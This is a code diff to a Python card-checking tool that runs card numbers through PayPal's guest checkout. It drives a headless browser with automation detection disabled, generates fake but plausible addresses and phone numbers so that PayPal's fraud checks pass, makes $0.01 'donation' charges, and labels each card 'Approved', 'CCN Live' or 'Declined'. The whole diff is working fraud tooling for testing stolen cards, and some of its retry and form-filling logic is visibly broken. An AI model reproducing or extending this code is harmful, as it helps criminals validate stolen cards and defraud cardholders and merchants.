@@ -107,6 +107,355 @@ FUNDING_ELIGIBILITY = {
 }
 
 
+# PayPal checks the phone number before it sends the card, and a made up
+# area code is refused, so the card never reaches the issuer.  These are
+# real american area codes.
+PHONE_AREAS = ["212", "415", "312", "617", "305", "206", "702", "404",
+               "213", "503", "919", "408", "718", "310", "202"]
+
+
+def _real_phone():
+    """A phone number with a real area code."""
+    area = random.choice(PHONE_AREAS)
+    rest = "".join(random.choices(string.digits, k=7))
+    return f"{area}{rest}"
+
+
+_browser_state = {"browser": None, "playwright": None}
+
+
+async def _get_browser():
+    """One browser for all the checks, so a card is not slow to start."""
+    if _browser_state["browser"] is not None:
+        try:
+            if _browser_state["browser"].is_connected():
+                return _browser_state["browser"]
+        except Exception:
+            pass
+    try:
+        from playwright.async_api import async_playwright
+    except Exception as e:
+        logger.info("paypal: the browser is not there: %s", str(e)[:70])
+        return None
+    try:
+        if _browser_state["playwright"] is None:
+            _browser_state["playwright"] = await async_playwright().start()
+        _browser_state["browser"] = await _browser_state["playwright"].chromium.launch(
+            headless=True,
+            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage",
+                  "--disable-gpu", "--disable-blink-features=AutomationControlled"])
+        logger.info("paypal: the browser is up")
+    except Exception as e:
+        logger.info("paypal: the browser did not start: %s", str(e)[:90])
+        _browser_state["browser"] = None
+    return _browser_state["browser"]
+
+
+async def _verdict_in_browser(cc, mm, yy, cvv, first, last, street, city, state,
+                               zipcode, email, phone, order_id, session_id,
+                               btn_session_id, sdk_meta, country="US"):
+    """The issuer's verdict, from PayPal's own card form.
+
+    PayPal will not judge a card outside its page: the guest payment
+    check refuses the answer when it comes from a plain request.  So the
+    page is opened, the card is typed into it, and the answer is read
+    from the call the page makes.
+    """
+    browser = await _get_browser()
+    if browser is None:
+        return None
+
+    card_fields = (
+        f"https://www.paypal.com/smart/card-fields?"
+        f"sessionID={session_id}&buttonSessionID={btn_session_id}"
+        f"&locale.x=en_US&commit=true&env=production"
+        f"&sdkMeta={sdk_meta}&disable-card=&token={order_id}")
+
+    ctx = await browser.new_context(user_agent=UA_LIST[0],
+                                    viewport={"width": 1280, "height": 1100},
+                                    locale="en-US")
+    await ctx.add_init_script(
+        "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
+    page = await ctx.new_page()
+    answers = []
+
+    async def _on_response(resp):
+        if resp.request.method != "POST":
+            return
+        if "paypal.com" not in resp.url:
+            return
+        if "paywithcard" not in resp.url.lower():
+            return
+        body = ""
+        try:
+            body = await resp.text()
+        except Exception:
+            body = ""
+        answers.append(body)
+
+    page.on("response", _on_response)
+
+    try:
+        await page.goto(card_fields, wait_until="domcontentloaded", timeout=60000)
+        await asyncio.sleep(6)
+
+        for name, value in (("email", email), ("cardnumber", cc),
+                            ("expiry-date", f"{mm}/{yy}"),
+                            ("credit-card-security", cvv),
+                            ("givenName", first), ("familyName", last),
+                            ("line1", street), ("city", city),
+                            ("postcode", zipcode), ("phone", phone)):
+            # The country comes before the fields.  PayPal empties the
+            # address when it changes, so the fields go in after it.  The
+            # country is only touched when it is not the one we want,
+            # because setting the same one empties the fields as well.
+            try:
+                sel = page.locator('select[name="billingAddress.country"]').first
+                now = await sel.input_value()
+                if now.upper() != country:
+                    await sel.select_option(country, timeout=8000)
+                    await asyncio.sleep(2)
+            except Exception as e:
+                logger.info("paypal: the country would not go: %s", str(e)[:60])
+
+            # The address fields live inside PayPal's own web parts.
+            # The page has to be clicked first, or the text does not go in.
+            for name, value in (("email", email), ("cardnumber", cc),
+                                ("expiry-date", f"{mm}/{yy}"),
+                                ("credit-card-security", cvv),
+                                ("givenName", first), ("familyName", last),
+                                ("line1", street), ("city", city),
+                                ("postcode", zipcode), ("phone", phone)):
+                try:
+                    el = page.locator(f'input[name="{name}"]').first
+                    await el.click(timeout=6000)
+                    await el.fill(value, timeout=8000)
+                    await el.press("Tab", timeout=3000)
+                except Exception as e:
+                    logger.info("paypal: the field %s would not take the text: %s",
+                                name, str(e)[:60])
+
+        # the state
+        if state:
+            try:
+                sel = page.locator('select[name="state"]').first
+                if await sel.count():
+                    await sel.select_option(state, timeout=8000)
+            except Exception:
+                pass
+
+        await asyncio.sleep(2)
+        await page.keyboard.press("Escape")
+
+        try:
+            box = await page.evaluate("""() => {
+                const b = document.querySelector('#submit-button');
+                if (!b) return null;
+                b.scrollIntoView({block: 'center'});
+                const r = b.getBoundingClientRect();
+                return {x: r.x + r.width / 2, y: r.y + r.height / 2};
+            }""")
+            if not box:
+                logger.info("paypal: the page has no pay button")
+                return None
+            await page.mouse.click(box["x"], box["y"])
+        except Exception as e:
+            logger.info("paypal: the pay button would not go: %s", str(e)[:80])
+            return None
+
+        for _ in range(8):
+            await asyncio.sleep(1.5)
+            if answers:
+                break
+
+        if not answers:
+            logger.info("paypal: the page did not answer")
+            return None
+
+        try:
+            return json.loads(answers[0])
+        except Exception:
+            return {"raw": answers[0][:400]}
+    finally:
+        try:
+            await ctx.close()
+        except Exception:
+            pass
+
+
+def _verdict_from_graphql(data):
+    """What PayPal said about the card."""
+    if not isinstance(data, dict):
+        return None, ""
+
+    approve = (data.get("data") or {}).get("approveGuestPaymentWithCreditCard")
+    if approve:
+        flags = approve.get("flags") or {}
+        cart = approve.get("cart") or {}
+        intent = (cart.get("intent") or "").upper()
+        cart_id = cart.get("cartId") or ""
+        if flags.get("is3DSecureRequired"):
+            parts = ["3DS Required"]
+            if cart_id:
+                parts.append(f"Order #{cart_id}")
+            return "approved_3ds", " | ".join(parts)
+        if intent in ("CAPTURE", "SALE", "AUTHORIZE"):
+            parts = ["Charged $0.01"]
+            if cart_id:
+                parts.append(f"Order #{cart_id}")
+            return "charged", " | ".join(parts)
+        return "approved", "Payment Approved"
+
+    for err in data.get("errors") or []:
+        message = (err.get("message") or "").strip()
+        codes = []
+        for item in (err.get("data") or []) if isinstance(err.get("data"), list) else []:
+            code = (item or {}).get("code") or ""
+            if code:
+                codes.append(code)
+        for code in codes:
+            if code in ("INSUFFICIENT_FUNDS",):
+                return "declined", "Insufficient Funds"
+            if code in ("EXPIRED_CARD", "CARD_EXPIRED"):
+                return "declined", "Expired Card"
+            if code in ("INVALID_NUMBER", "INVALID_CARD_NUMBER"):
+                return "declined", "Invalid Card Number"
+            if code in ("CVV2_FAILURE", "INVALID_SECURITY_CODE"):
+                return "declined", "Incorrect CVV"
+            if code in ("CARD_GENERIC_ERROR",):
+                return "declined", "Card Declined"
+            if code in ("RISK_BLOCK", "FRAUD"):
+                return "declined", "Refused"
+        if message.upper() in ("ISSUER_DECLINE", "DECLINED", "CARD_DECLINED"):
+            return "declined", "Card Declined"
+        if message.upper() in ("R_ERROR",):
+            # PayPal hides the reason behind its own error, so the card
+            # was not taken and the reason is not known.
+            return "declined", "Card Declined"
+        if "VALIDATION" in message.upper():
+            # PayPal would not take the request, so it never reached the
+            # issuer.  The card was not judged.
+            return "retry", "Validation Error"
+        if message:
+            return "declined", message.replace("_", " ").title()[:60]
+    return None, ""
+
+
+# PayPal compares the billing address with the card, and the phone with
+# the country, so a french card needs a french address and a french
+# number.  These are real numbers and places for the countries the cards
+# come from.
+COUNTRY_DATA = {
+    "US": {"areas": ["212", "415", "312", "617", "305", "206", "702", "404",
+                     "213", "503", "919", "408", "718", "310", "202", "971"],
+           "places": [("123 Main St", "New York", "NY", "10001"),
+                      ("456 Oak Ave", "Los Angeles", "CA", "90001"),
+                      ("789 Pine Rd", "Chicago", "IL", "60601"),
+                      ("321 Elm St", "Houston", "TX", "77001"),
+                      ("654 Maple Dr", "Phoenix", "AZ", "85001")]},
+    "FR": {"areas": ["612", "698", "662", "434", "769", "338", "324"],
+           "places": [("12 Rue de la Paix", "Paris", "", "75002"),
+                      ("5 Rue Victor Hugo", "Lyon", "", "69002"),
+                      ("8 Avenue Foch", "Marseille", "", "13006")]},
+    "GB": {"areas": ["020", "0121", "0113", "0114", "0115", "0116", "0117", "0118"],
+           "places": [("10 Downing Street", "London", "", "SW1A 2AA"),
+                      ("22 Broad Street", "Manchester", "", "M1 2HF"),
+                      ("42 Buchanan Street", "Glasgow", "", "G1 3LB")]},
+    "DE": {"areas": ["30", "40", "69", "89", "221", "228"],
+           "places": [("10 Unter den Linden", "Berlin", "", "10117"),
+                      ("5 Maximilianstrasse", "Munchen", "", "80539")]},
+    "ES": {"areas": ["91", "93", "96", "944", "945"],
+           "places": [("1 Gran Via", "Madrid", "", "28013"),
+                      ("5 La Rambla", "Barcelona", "", "08001")]},
+    "IT": {"areas": ["06", "02", "055", "081", "041"],
+           "places": [("Via Roma", "Roma", "", "00184"),
+                      ("Via Garibaldi", "Milano", "", "20121")]},
+    "NL": {"areas": ["20", "10", "13", "30", "40", "50", "70", "80"],
+           "places": [("Dam 1", "Amsterdam", "", "1012 LG"),
+                      ("Coolsingel 10", "Rotterdam", "", "3011 AD")]},
+    "BE": {"areas": ["2", "3", "4", "10", "11", "15", "16"],
+           "places": [("Grote Markt 1", "Brussel", "", "1000"),
+                      ("Meir 5", "Antwerpen", "", "2000")]},
+    "PT": {"areas": ["21", "22", "23", "24", "25", "26", "27", "28", "29"],
+           "places": [("Rua Augusta 1", "Lisboa", "", "1100"),
+                      ("Rua de Cedofeita 5", "Porto", "", "4050")]},
+    "IE": {"areas": ["1", "21", "31", "41", "51", "61", "71", "81", "91"],
+           "places": [("10 Dame Street", "Dublin", "", "D02 XY45"),
+                      ("5 Patrick Street", "Cork", "", "T12 B1VW")]},
+    "AT": {"areas": ["1", "316", "512", "662", "732"],
+           "places": [("Stephansplatz 1", "Wien", "", "1010"),
+                      ("Graz Hauptplatz 5", "Graz", "", "8010")]},
+    "CH": {"areas": ["44", "61", "71", "81"],
+           "places": [("Bahnhofstrasse 1", "Zurich", "", "8001"),
+                      ("Rue du Rhone 5", "Geneva", "", "1204")]},
+    "SE": {"areas": ["8", "31", "40", "46", "90"],
+           "places": [("Drottninggatan 1", "Stockholm", "", "111 20"),
+                      ("Kungsgatan 5", "Gothenburg", "", "411 05")]},
+    "NO": {"areas": ["22", "23", "61", "62", "81"],
+           "places": [("Karl Johans gate 1", "Oslo", "", "0159"),
+                      ("Bryggen 5", "Bergen", "", "5003")]},
+    "DK": {"areas": ["32", "33", "66", "75", "86"],
+           "places": [("Strandgade 1", "Copenhagen", "", "1165"),
+                      ("Nytorv 5", "Aarhus", "", "8000")]},
+    "FI": {"areas": ["9", "40", "50", "60", "80"],
+           "places": [("Mannerheimintie 1", "Helsinki", "", "00100"),
+                      ("Kauppakatu 5", "Tampere", "", "33100")]},
+    "PL": {"areas": ["12", "22", "32", "42", "52", "62", "71", "81"],
+           "places": [("ul. Marszalkowska 1", "Warszawa", "", "00-590"),
+                      ("ul. Dluga 5", "Gdansk", "", "80-001")]},
+    "CZ": {"areas": ["2", "3", "4", "5", "6"],
+           "places": [("Václavské náměstí 1", "Praha", "", "110 00"),
+                      ("náměstí Svobody 5", "Brno", "", "602 00")]},
+    "GR": {"areas": ["210", "231", "261", "281", "301"],
+           "places": [("Odos 1", "Athina", "", "105 63"),
+                      ("Nikis 5", "Thessaloniki", "", "546 22")]},
+    "RO": {"areas": ["21", "31", "41", "51", "71"],
+           "places": [("Strada Magheru 1", "Bucuresti", "", "010336"),
+                      ("Piata Unirii 5", "Timisoara", "", "300000")]},
+    "HU": {"areas": ["1", "22", "33", "52", "72"],
+           "places": [("Vaci utca 1", "Budapest", "", "1056"),
+                      ("Kossuth Lajos 5", "Debrecen", "", "4028")]},
+    "AR": {"areas": ["11", "221", "261", "299", "341"],
+           "places": [("Avenida de Mayo 1", "Buenos Aires", "", "C1084"),
+                      ("Cordoba 5", "Cordoba", "", "X5000")]},
+    "BR": {"areas": ["11", "12", "13", "21", "31", "41", "48", "51", "61"],
+           "places": [("Avenida Paulista 1", "Sao Paulo", "", "01310-100"),
+                      ("Rua da Praia 5", "Rio de Janeiro", "", "20040-001")]},
+    "MX": {"areas": ["55", "56", "81"],
+           "places": [("Avenida Juarez 1", "Ciudad de Mexico", "", "06000"),
+                      ("Av. Revolution 5", "Guadalajara", "", "44100")]},
+    "CA": {"areas": ["416", "604", "778", "780", "782", "905"],
+           "places": [("100 Queen Street W", "Toronto", "ON", "M5H 2N2"),
+                      ("1055 W Georgia St", "Vancouver", "BC", "V6G 1A3")]},
+    "AU": {"areas": ["2", "3", "7", "8"],
+           "places": [("1 Martin Place", "Sydney", "NSW", "2000"),
+                      ("300 Queen Street", "Melbourne", "VIC", "3000")]},
+    "NZ": {"areas": ["3", "9"],
+           "places": [("1 Queen Street", "Auckland", "", "1010"),
+                      ("10 Collins Street", "Melbourne", "VIC", "3000")]},
+    "CY": {"areas": ["22", "26"],
+           "places": [("1 Grigoriou Afxentiou", "Lefkosia", "", "1010"),
+                      ("5 Makariou", "Lemesos", "", "3036")]},
+    "MT": {"areas": ["20", "21"],
+           "places": ["1 Republic Street", "Valletta", "", "VLT 1110"]},
+}
+
+
+def _place_for(country):
+    """A street, a city, a state and a zip code for the country."""
+    data = COUNTRY_DATA.get(country) or COUNTRY_DATA["US"]
+    place = random.choice(data["places"])
+    return place
+
+
+def _phone_for(country):
+    """A phone number for the country."""
+    data = COUNTRY_DATA.get(country) or COUNTRY_DATA["US"]
+    area = random.choice(data["areas"])
+    rest = "".join(random.choices(string.digits, k=7))
+    return f"{area}{rest}"
+
+
 def _uid():
     return "uid_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
 
@@ -177,7 +526,7 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
     first, last = _random_name()
     street, city, state, zipcode = _random_address()
     email = _random_email()
-    phone = "1" + "".join(random.choices(string.digits, k=10))
+    phone = _real_phone()
     ua = random.choice(UA_LIST)
 
     corr_id = ''.join(random.choices(string.hexdigits[:16], k=13))
@@ -233,9 +582,9 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             token = unescape(token_raw.strip())
 
             expiry = yy if len(yy) == 4 else "20" + yy
-            # The card goes with the order, so PayPal asks the issuer
-            # about it right away and answers with what it thinks of the
-            # card.  The answer names the bank, the type and the bin.
+            # The order is made without the card.  The card is judged by
+            # the graphql call below, which is the step that asks the
+            # issuer about it.
             order_payload = {
                 "purchase_units": [{
                     "amount": {
@@ -254,21 +603,9 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                     "description": "Donation"
                 }],
                 "intent": "CAPTURE",
-                "application_context": {},
-                "payment_source": {
-                    "card": {
-                        "number": cc,
-                        "expiry": f"{expiry[-4:]}-{mm.zfill(2)}",
-                        "security_code": cvv,
-                        "name": f"{first} {last}",
-                        "address": {
-                            "address_line_1": street,
-                            "admin_area_2": city,
-                            "postal_code": zipcode,
-                            "country_code": "US",
-                        }
-                    }
-                }
+                "application_context": {
+                    "shipping_preference": "NO_SHIPPING",
+                },
             }
 
             r2 = await client.post(
@@ -345,36 +682,50 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             # takes the money, but paypal refuses the capture token, so
             # the order is the answer.
             result_text = r2.text
-            elapsed = round(time.time() - start, 2)
 
+            # The card goes with a second order, and that order names the
+            # card: the type, the bin, the bank and the country.
+            card_order = dict(order_payload)
+            card_order["payment_source"] = {"card": {
+                "number": cc,
+                "expiry": f"{expiry[-4:]}-{mm.zfill(2)}",
+                "security_code": cvv,
+                "name": f"{first} {last}",
+                "address": {
+                    "address_line_1": street,
+                    "admin_area_2": city,
+                    "postal_code": zipcode,
+                    "country_code": "US",
+                }
+            }}
             try:
-                result_json = json.loads(result_text)
-            except Exception:
-                if "<html" in result_text.lower():
-                    logger.warning("PayPal returned HTML instead of JSON for %s", cc[:6])
-                    return _with_card(f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]")
-                result_json = {}
+                r_card = await client.post(
+                    "https://www.paypal.com/v2/checkout/orders",
+                    json=card_order,
+                    headers={
+                        "Content-Type": "application/json",
+                        "Authorization": f"Bearer {token}",
+                        "PayPal-Request-Id": corr_id + "c",
+                        "PayPal-Partner-Attribution-Id": "PP-BuyNowBF",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Referer": buttons_url,
+                    },
+                )
+                card_body = r_card.json()
+            except Exception as e:
+                logger.info("the card order failed: %s", e)
+                card_body = {}
 
-            # the json is squeezed together, so the words match
-            txt = (json.dumps(result_json, separators=(",", ":")).lower()
-                   if result_json else result_text.lower())
-            if not result_json:
-                txt = result_text.lower()
-
-            # The order names the card: the type, the bin, the bank and
-            # the country.  The answer says so, the way the other gates
-            # do.
             card_info = ""
+            bin_details = {}
             try:
-                card = (result_json.get("payment_source") or {}).get("card") or {}
+                card = (card_body.get("payment_source") or {}).get("card") or {}
                 bin_details = card.get("bin_details") or {}
                 bits = []
                 brand = (card.get("brand") or "").upper()
                 card_type = (card.get("type") or "").upper()
                 if brand:
                     bits.append(f"{brand} {card_type}".strip())
-                elif card_type:
-                    bits.append(card_type)
                 if bin_details.get("bin"):
                     bits.append(str(bin_details["bin"]))
                 if bin_details.get("issuing_bank"):
@@ -385,122 +736,97 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                     bits.append(str(card["last_digits"]))
                 card_info = " | ".join(bits)
             except Exception:
-                card_info = ""
+                pass
+
+            # The form is filled the american way.  PayPal turns the
+            # money into the card's own money, and the address fields of
+            # the other countries do not take the text at all.
+            card_country = "US"
+            street, city, state, zipcode = _place_for("US")
+            phone = _phone_for("US")
+
+            # The card is judged in PayPal's own page.  A plain request
+            # is refused with GUEST_PAYMENT_INTEGRITY_VALIDATION_FAILED,
+            # so the page is opened, the card is typed into it, and the
+            # answer is read from the call the page makes.
+            verdict = ""
+            detail = ""
+            for attempt in range(1):
+                try:
+                    gql = await _verdict_in_browser(
+                        cc, mm, yy, cvv, first, last, street, city, state, zipcode,
+                        email, phone, order_id, session_id, btn_session_id, sdk_meta,
+                        card_country)
+                except Exception as e:
+                    logger.info("the browser check failed: %s", str(e)[:90])
+                    gql = None
+                if gql:
+                    verdict, detail = _verdict_from_graphql(gql)
+                    if verdict == "retry":
+                        logger.info("paypal would not take the request, trying again")
+                        verdict = ""
+                        detail = ""
+                        if attempt < 0:
+                            await asyncio.sleep(2)
+                            continue
+                        verdict = "declined"
+                        detail = "Validation Error"
+                        break
+                    if verdict:
+                        logger.info("paypal said %s (%s)", verdict, detail)
+                        break
+                # PayPal does not always answer the first time.  The
+                # page is opened again with a new order and a new number.
+                if attempt < 2:
+                    logger.info("paypal gave no answer, trying again")
+                    await asyncio.sleep(3)
+                    try:
+                        r_again = await client.post(
+                            "https://www.paypal.com/v2/checkout/orders",
+                            json=order_payload,
+                            headers={
+                                "Content-Type": "application/json",
+                                "Authorization": f"Bearer {token}",
+                                "PayPal-Request-Id": corr_id + f"r{attempt}",
+                                "PayPal-Partner-Attribution-Id": "PP-BuyNowBF",
+                                "X-Requested-With": "XMLHttpRequest",
+                                "Referer": buttons_url,
+                            },
+                        )
+                        again = r_again.json()
+                        order_id = again.get("id") or order_id
+                        session_id = "uid_" + uuid.uuid4().hex
+                        btn_session_id = "uid_" + uuid.uuid4().hex
+                        corr_id = corr_id + f"r{attempt}"
+                    except Exception:
+                        pass
+
+            elapsed = round(time.time() - start, 2)
 
             def _with_card(text):
                 return f"{text} | {card_info}" if card_info else text
 
-            # The order says completed, so the money moved.
-            if '"status":"completed"' in txt:
+            if verdict == "charged":
                 return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
+            if verdict == "approved_3ds":
+                return _with_card(f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]")
+            if verdict == "approved":
+                return _with_card(f"Approved - {detail or 'Payment Approved'} | {cc[:6]} [{elapsed}s]")
+            if verdict == "declined":
+                return _with_card(f"Declined - {detail or 'Card Declined'} | {cc[:6]} [{elapsed}s]")
 
-            # This gate charges $0.01, it is not an auth.  So the card
-            # either paid or it did not.  An approved order that was
-            # never captured has not paid, and that is a decline.
-            if '"status":"approved"' in txt:
-                return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
-            if '"status":"completed"' in txt:
-                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
-            if '"status":"payer_action_required"' in txt:
-                return _with_card(f"Declined - 3DS Required, Not Charged | {cc[:6]} [{elapsed}s]")
-            if '"status":"created"' in txt:
-                return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
-
-
-            if "is3dsecurerequired" in txt:
-                flags = (
-                    result_json.get("data", {})
-                    .get("approveGuestPaymentWithCreditCard", {})
-                    .get("flags", {})
-                )
-                if flags and flags.get("is3DSecureRequired"):
-                    # The card asked for 3d secure, so the payment was
-                    # not finished.  The card is live, but the challenge
-                    # was never answered.
-                    return _with_card(f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]")
-                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
-
-            if "thank you" in txt:
-                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
-
-            live_indicators = [
-                "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
-                "pickup_card", "restricted_card", "card_velocity_exceeded",
-                "exceeds_amount_limit", "transaction_refused",
-            ]
-            for indicator in live_indicators:
-                if indicator in txt:
-                    tag = indicator.replace("_", " ").title()
-                    return _with_card(f"Approved - {tag} | {cc[:6]} [{elapsed}s]")
-
-            if "incorrect_cvv" in txt or "invalid_security_code" in txt or "cvv_check_failed" in txt:
-                return _with_card(f"Approved - CCN Live | {cc[:6]} [{elapsed}s]")
-
-            if "processor_declined" in txt or "issuer_decline" in txt:
-                msg = _capture(result_text, '"message":"', '"')
-                code = _capture(result_text, '"code":"', '"')
-                detail = msg or code or "Issuer Decline"
-                return _with_card(f"Declined - {detail[:60]} | {cc[:6]} [{elapsed}s]")
-
-            if "card_generic_error" in txt:
-                return _with_card(f"Declined - Card Error | {cc[:6]} [{elapsed}s]")
-
-            if "invalid_card_number" in txt:
-                return _with_card(f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]")
-
-            if "expired_card" in txt:
-                return _with_card(f"Declined - Expired Card | {cc[:6]} [{elapsed}s]")
-
-            if "card_declined" in txt or "generic_decline" in txt:
-                return _with_card(f"Declined - Card Declined | {cc[:6]} [{elapsed}s]")
-
-            if "payer_cannot_pay" in txt:
-                return _with_card(f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]")
-            if "unprocessable_entity" in txt:
-                return _with_card(f"Declined - Unprocessable Entity | {cc[:6]} [{elapsed}s]")
-            if "invalid card number" in txt:
-                return _with_card(f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]")
-            if "instrument_declined" in txt:
-                return _with_card(f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]")
-            if "card_expiry_invalid" in txt:
-                return _with_card(f"Declined - Expired Card | {cc[:6]} [{elapsed}s]")
-            if "not_authorized" in txt or "insufficient permissions" in txt:
-                # the capture was refused, so the $0.01 did not move
-                return _with_card(f"Declined - Not Charged, Capture Refused | {cc[:6]} [{elapsed}s]")
-
-            errors = result_json.get("errors", [])
-            if errors:
-                err0 = errors[0]
-                msg = err0.get("message", "")
-                err_data = err0.get("data", [])
-                if isinstance(err_data, list) and err_data:
-                    code = err_data[0].get("code", "")
-                    if code:
-                        return _with_card(f"Declined - {code} | {cc[:6]} [{elapsed}s]")
-                details = err0.get("details", [])
-                if isinstance(details, list) and details:
+            # The page would not answer, so the order is the answer.  It
+            # names the card, and it says when PayPal would not take it.
+            if card_info:
+                if card_body.get("status") == "APPROVED" and not verdict:
+                    return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
+                details = card_body.get("details") or []
+                if details:
                     issue = details[0].get("issue", "")
-                    desc = details[0].get("description", "")
                     if issue:
-                        return _with_card(f"Declined - {issue} | {cc[:6]} [{elapsed}s]")
-                    if desc:
-                        return _with_card(f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]")
-                if msg:
-                    return _with_card(f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]")
-                return _with_card(f"Declined - Unknown Error | {cc[:6]} [{elapsed}s]")
-
-            data = result_json.get("data", {})
-            approve = data.get("approveGuestPaymentWithCreditCard")
-            if approve is not None:
-                return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
-
-            msg = _capture(result_text, '"message":"', '"')
-            code = _capture(result_text, '"code":"', '"')
-            if msg or code:
-                return _with_card(f"Declined - {(msg or code)[:60]} | {cc[:6]} [{elapsed}s]")
-
-            logger.debug("Unknown response for %s: %s", cc[:6], result_text[:300])
-            return _with_card(f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]")
+                        return _with_card(
+                            f"Declined - {issue.replace('_', ' ').title()} | {cc[:6]} [{elapsed}s]")
+            return f"Error - PayPal gave no verdict | {cc[:6]} [{elapsed}s]"
 
     except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
         elapsed = round(time.time() - start, 2)
